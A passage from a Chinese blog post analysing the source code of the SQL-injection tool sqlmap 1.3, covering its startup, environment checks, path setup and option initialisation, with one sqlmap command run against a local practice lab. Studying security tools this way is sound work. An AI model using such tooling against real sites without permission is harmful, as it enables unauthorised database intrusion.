<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">






<link rel="stylesheet" href="/css/main.css?v=7.2.0">






<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">








<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
    copycode: {"enable":false,"show_result":false,"style":null},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    translation: {
      copy_button: '复制',
      copy_success: '复制成功',
      copy_failure: '复制失败'
    }
  };
</script>

  <meta name="description" content="版本是 sqlmap-1.3">
<meta name="keywords" content="源码">
<meta property="og:type" content="article">
<meta property="og:title" content="sqlmap源码浅析">
<meta property="og:url" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/index.html">
<meta property="og:site_name" content="Recar的笔记">
<meta property="og:description" content="版本是 sqlmap-1.3">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/images/check_if_waf.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/images/check_waf_payload.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%AA%8C%E8%AF%81payload%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%AA%8C%E8%AF%81payload%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B21.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B22.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B23.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A51.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A52.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A81.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A82.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/%E6%9C%80%E5%90%8E%E8%BE%93%E5%87%BA.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/sqlmap%E7%AE%80%E5%8D%95%E6%B5%81%E7%A8%8B%E5%9B%BE.png">
<meta property="og:updated_time" content="2021-06-11T10:33:06.345Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="sqlmap源码浅析">
<meta name="twitter:description" content="版本是 sqlmap-1.3">
<meta name="twitter:image" content="http://yoursite.com/2019/11/08/sqlmap源码浅析/images/check_if_waf.jpg">





  
  
  <link rel="canonical" href="http://yoursite.com/2019/11/08/sqlmap源码浅析/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  
  <title>sqlmap源码浅析 | Recar的笔记</title>
  






  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f6Wf4b00fa957d7290583a86b0d8c2de1";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>







  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Recar的笔记</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



</div>
    </header>

    
  
  

  

  <a href="https://github.com/Ciyfly" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
      

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/sqlmap源码浅析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Recar">
      <meta itemprop="description" content="年轻人就应该多读源码多读书">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Recar的笔记">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">sqlmap源码浅析

              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-11-08 18:42:37" itemprop="dateCreated datePublished" datetime="2019-11-08T18:42:37+00:00">2019-11-08</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2021-06-11 10:33:06" itemprop="dateModified" datetime="2021-06-11T10:33:06+00:00">2021-06-11</time>
              </span>
            
          

          

          
          

          

          

          <br>
          

          

          
            <div class="post-description">版本是 sqlmap-1.3</div>
          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="SQLMAP-源码简单分析"><a href="#SQLMAP-源码简单分析" class="headerlink" title="SQLMAP 源码简单分析"></a>SQLMAP 源码简单分析</h1><p>这里分析的版本是 1.3<br>源码写的有好的地方和也有不好的地方<br>这里学习下整体的流程和一些技巧<br>看下是怎么样去测试注入的<br>这里就是最简单的 -u 一路跟下去  </p>
<p>静态代码和断点调试跟进代码</p>
<h2 id="简单的使用"><a href="#简单的使用" class="headerlink" title="简单的使用"></a>简单的使用</h2><p>找了个注入点 -u 指定url<br>最简单的注入<br><code>http://192.168.19.128:8089/Less-1/?id=1</code>  </p>
<p><code>python sqlmap.py -u &quot;http://192.168.19.128:8089/Less-1/?id=1&quot;</code>  </p>
<p>这里先看下主函数  </p>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>这里主要的点是对于 ctrl+c的异常捕获还有else用法 exit的方式  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="comment"># 对于 ctrl+c的异常捕获后pass</span></span><br><span class="line">    <span class="comment"># 是捕获异常的方式 我之前写的和网上很多的都是捕获信号量的方式</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 无论有没有异常都执行对多线程进行停止</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># Reference: http://stackoverflow.com/questions/1635080/terminate-a-multi-thread-python-program</span></span><br><span class="line">        <span class="comment"># 返回正在运行的线程数 大于1 直接退出</span></span><br><span class="line">        <span class="keyword">if</span> threading.activeCount() &gt; <span class="number">1</span>:</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 这里的else是如果没有异常就执行else下的程序否则不执行</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># cancelling postponed imports (because of Travis CI checks)</span></span><br><span class="line">    <span class="keyword">from</span> lib.controller.controller <span class="keyword">import</span> start</span><br></pre></td></tr></table></figure>

<p>这里对 退出做下了解  </p>
<p>os._exit()与 sys.exit()  </p>
<p>sys.exit()调用后会引发SystemExit异常，可以捕获此异常做清理工作<br>os._exit()直接将python解释器退出，余下的语句不会执行  </p>
<p>一般来说os._exit() 用于在线程中退出<br>sys.exit() 用于在主线程中退出  </p>
<p>对于退出状态码<br>exit(0)：无错误退出<br>exit(1)：有错误退出  </p>
<h3 id="初步准备"><a href="#初步准备" class="headerlink" title="初步准备"></a>初步准备</h3><p>主要是如下4个函数  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Main function of sqlmap when running from command line.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dirtyPatches()</span><br><span class="line">        checkEnvironment()</span><br><span class="line">        setPaths(modulePath())</span><br><span class="line">        banner()</span><br></pre></td></tr></table></figure>

<h4 id="dirtyPatches"><a href="#dirtyPatches" class="headerlink" title="dirtyPatches"></a>dirtyPatches</h4><p>这个是打一些适配补丁  </p>
<p>对于httplib 接收长结果设置兼容<br>对于windows下异常崩溃的问题  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dirtyPatches</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Place for "dirty" Python related patches</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># 接受过长的结果行（例如，SQLi导致HTTP标头响应）</span></span><br><span class="line">   <span class="comment"># 设置接收长的结果</span></span><br><span class="line">    httplib._MAXLINE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># add support for inet_pton() on Windows OS</span></span><br><span class="line">    <span class="keyword">if</span> IS_WIN:</span><br><span class="line">        <span class="keyword">from</span> thirdparty.wininetpton <span class="keyword">import</span> win_inet_pton</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reference: https://github.com/nodejs/node/issues/12786#issuecomment-298652440</span></span><br><span class="line">    <span class="comment"># 对于windows cmd下python编码异常崩溃的问题解决</span></span><br><span class="line">    codecs.register(<span class="keyword">lambda</span> name: codecs.lookup(<span class="string">"utf-8"</span>) <span class="keyword">if</span> name == <span class="string">"cp65001"</span> <span class="keyword">else</span> <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<h4 id="checkEnvironment"><a href="#checkEnvironment" class="headerlink" title="checkEnvironment"></a>checkEnvironment</h4><p>检测环境 环境变量等将一些全局使用的变量加载到全局   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测环境</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkEnvironment</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># python编译成exe后获取绝对路径</span></span><br><span class="line">        os.path.isdir(modulePath())</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        errMsg = <span class="string">"your system does not properly handle non-ASCII paths. "</span></span><br><span class="line">        errMsg += <span class="string">"Please move the sqlmap's directory to the other location"</span></span><br><span class="line">        logger.critical(errMsg)</span><br><span class="line">        <span class="keyword">raise</span> SystemExit</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> distutils.version.LooseVersion(VERSION) &lt; distutils.version.LooseVersion(<span class="string">"1.0"</span>):</span><br><span class="line">        errMsg = <span class="string">"your runtime environment (e.g. PYTHONPATH) is "</span></span><br><span class="line">        errMsg += <span class="string">"broken. Please make sure that you are not running "</span></span><br><span class="line">        errMsg += <span class="string">"newer versions of sqlmap with runtime scripts for older "</span></span><br><span class="line">        errMsg += <span class="string">"versions"</span></span><br><span class="line">        logger.critical(errMsg)</span><br><span class="line">        <span class="keyword">raise</span> SystemExit</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Patch for pip (import) environment</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"sqlmap.sqlmap"</span> <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="comment"># 如果sys.modules 字典 也就是导入了 sqlmap.sqlmap 那么就对应的获取把data 异常都加载到全局 做全局变量 这个data里面是各种多各个文件共享的一些变量</span></span><br><span class="line">        <span class="comment"># 这里可以看到用 getattr的形式获取 sys.modules中的里面的变量</span></span><br><span class="line">        <span class="comment"># 这样把那些变量加载到全局</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="string">"cmdLineOptions"</span>, <span class="string">"conf"</span>, <span class="string">"kb"</span>):</span><br><span class="line">            globals()[_] = getattr(sys.modules[<span class="string">"lib.core.data"</span>], _)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="string">"SqlmapBaseException"</span>, <span class="string">"SqlmapShellQuitException"</span>, <span class="string">"SqlmapSilentQuitException"</span>, <span class="string">"SqlmapUserQuitException"</span>):</span><br><span class="line">            globals()[_] = getattr(sys.modules[<span class="string">"lib.core.exception"</span>], _)</span><br></pre></td></tr></table></figure>

<h4 id="setPaths"><a href="#setPaths" class="headerlink" title="setPaths"></a>setPaths</h4><p>设置绝对路径<br>这里对于 一些额外的路径加载成绝对路径 这里我们的分析没有涉及到这些像绕waf变形脚本和shell等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setPaths</span><span class="params">(rootPath)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Sets absolute paths for project directories and files</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    paths.SQLMAP_ROOT_PATH = rootPath</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sqlmap paths</span></span><br><span class="line">    paths.SQLMAP_EXTRAS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="string">"extra"</span>)</span><br><span class="line">    paths.SQLMAP_PROCS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="string">"procs"</span>)</span><br><span class="line">    paths.SQLMAP_SHELL_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="string">"shell"</span>)</span><br><span class="line">    paths.SQLMAP_TAMPER_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="string">"tamper"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="banner"><a href="#banner" class="headerlink" title="banner"></a>banner</h4><p>就是输出sqlmap  </p>
<p>上面是  main的环境的初始化的一些操作  </p>
<h4 id="获取命令行参数等数据"><a href="#获取命令行参数等数据" class="headerlink" title="获取命令行参数等数据"></a>获取命令行参数等数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 存储原始命令行选项以备以后恢复</span></span><br><span class="line">cmdLineOptions.update(cmdLineParser().__dict__)</span><br><span class="line">initOptions(cmdLineOptions)</span><br></pre></td></tr></table></figure>

<p>这里从如下导入的<br>cmdLineOptions 初始值为一个自定义的字典类<br>继承自字典并做了一些封装 用于存储数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> cmdLineOptions</span><br><span class="line">cmdLineOptions = AttribDict()</span><br></pre></td></tr></table></figure>

<p>使用 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    &gt;&gt;&gt; foo = AttribDict()</span><br><span class="line">    &gt;&gt;&gt; foo.bar = <span class="number">1</span></span><br><span class="line">    &gt;&gt;&gt; foo.bar</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">字典的update操作 合并字典</span><br><span class="line">`cmdLineOptions.update(cmdLineParser().__dict__)`  </span><br><span class="line"></span><br><span class="line">然后调用 initOptions  </span><br><span class="line">这个命令行函数简单跟入下</span><br><span class="line">主要是初始化 config   </span><br><span class="line">将命令行参数和配置文件合并到一起 作为一个conf</span><br><span class="line">这里有三个函数</span><br><span class="line">```python</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initOptions</span><span class="params">(inputOptions=AttribDict<span class="params">()</span>, overrideOptions=False)</span>:</span></span><br><span class="line">    _setConfAttributes()</span><br><span class="line">    _setKnowledgeBaseAttributes()</span><br><span class="line">    _mergeOptions(inputOptions, overrideOptions)</span><br></pre></td></tr></table></figure>

<p><code>_setConfAttributes</code> 是初始化配置信息 conf<br>这个conf后面很多地方在使用<br>可以简单看下代码都是初始化一些变量值   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_setConfAttributes</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    This function set some needed attributes into the configuration</span></span><br><span class="line"><span class="string">    singleton.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    debugMsg = <span class="string">"initializing the configuration"</span></span><br><span class="line">    logger.debug(debugMsg)</span><br><span class="line"></span><br><span class="line">    conf.authUsername = <span class="literal">None</span></span><br><span class="line">    conf.authPassword = <span class="literal">None</span></span><br><span class="line">    conf.boundaries = []</span><br><span class="line">    conf.cj = <span class="literal">None</span></span><br><span class="line">    conf.dbmsConnector = <span class="literal">None</span></span><br><span class="line">    conf.dbmsHandler = <span class="literal">None</span></span><br><span class="line">    conf.dnsServer = <span class="literal">None</span></span><br><span class="line">    conf.dumpPath = <span class="literal">None</span></span><br><span class="line">    conf.hashDB = <span class="literal">None</span></span><br><span class="line">    conf.hashDBFile = <span class="literal">None</span></span><br><span class="line">    conf.httpCollector = <span class="literal">None</span></span><br><span class="line">    conf.httpHeaders = []</span><br><span class="line">    conf.hostname = <span class="literal">None</span></span><br><span class="line">    conf.ipv6 = <span class="literal">False</span></span><br><span class="line">    conf.multipleTargets = <span class="literal">False</span></span><br><span class="line">    conf.outputPath = <span class="literal">None</span></span><br><span class="line">    conf.paramDict = &#123;&#125;</span><br><span class="line">    conf.parameters = &#123;&#125;</span><br><span class="line">    conf.path = <span class="literal">None</span></span><br><span class="line">    conf.port = <span class="literal">None</span></span><br><span class="line">    conf.proxyList = <span class="literal">None</span></span><br><span class="line">    conf.resultsFilename = <span class="literal">None</span></span><br><span class="line">    conf.resultsFP = <span class="literal">None</span></span><br><span class="line">    conf.scheme = <span class="literal">None</span></span><br><span class="line">    conf.tests = []</span><br><span class="line">    conf.trafficFP = <span class="literal">None</span></span><br><span class="line">    conf.HARCollectorFactory = <span class="literal">None</span></span><br><span class="line">    conf.fileWriteType = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p><code>_setKnowledgeBaseAttributes</code><br>将各种的值初始化给 knowledge base<br>kb 也就是后面经常使用的</p>
<p><code>_mergeOptions</code><br>将命令行选项与配置文件和默认选项合并。</p>
<p>这里 初始化了 kb conf 这两个后面经常使用的数据对象  </p>
<h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><p>然后 判断是否是api<br>如果是的话就会重新加载输出流和日志  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.get(<span class="string">"api"</span>):</span><br><span class="line">    <span class="comment"># heavy imports</span></span><br><span class="line">    <span class="keyword">from</span> lib.utils.api <span class="keyword">import</span> StdDbOut</span><br><span class="line">    <span class="keyword">from</span> lib.utils.api <span class="keyword">import</span> setRestAPILog</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Overwrite system standard output and standard error to write</span></span><br><span class="line">    <span class="comment"># to an IPC database</span></span><br><span class="line">    sys.stdout = StdDbOut(conf.taskid, messagetype=<span class="string">"stdout"</span>)</span><br><span class="line">    sys.stderr = StdDbOut(conf.taskid, messagetype=<span class="string">"stderr"</span>)</span><br><span class="line">    setRestAPILog()</span><br></pre></td></tr></table></figure>

<h3 id="init-根据参数和命令行初始化一些配置相关的数据"><a href="#init-根据参数和命令行初始化一些配置相关的数据" class="headerlink" title="init 根据参数和命令行初始化一些配置相关的数据"></a>init 根据参数和命令行初始化一些配置相关的数据</h3><p>比如说 cookie  代理 设置dbms等  </p>
<p>这个init方法的位置是  </p>
<p><code>from lib.core.option import init</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 